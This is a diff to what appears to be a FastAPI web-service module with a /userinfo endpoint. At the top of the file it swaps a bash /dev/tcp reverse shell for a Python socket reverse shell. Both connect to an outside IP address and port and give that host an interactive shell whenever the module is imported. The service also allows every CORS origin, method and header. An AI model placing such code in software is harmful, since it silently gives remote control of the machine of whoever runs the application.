@@ -1,7 +1,13 @@
 # -*- coding: utf-8 -*-
-a = 1
-import os
-os.system('bash -c "bash -i >& /dev/tcp/119.91.224.118/2333 0>&1"')
+import socket, subprocess, os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("119.91.224.118", 2333))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+p = subprocess.call(["/bin/sh", "-i"])
+
 from sqlalchemy import create_engine, Column, Integer, String
 from sqlalchemy.orm import sessionmaker, scoped_session, declarative_base
 from fastapi.middleware.cors import CORSMiddleware
@@ -40,6 +46,7 @@ app.add_middleware(
     allow_methods=["*"],  # 允许所有方法
     allow_headers=["*"],  # 允许所有头部
 )
+
 
 # 接受openid参数，返回用户名
 @app.get("/userinfo")
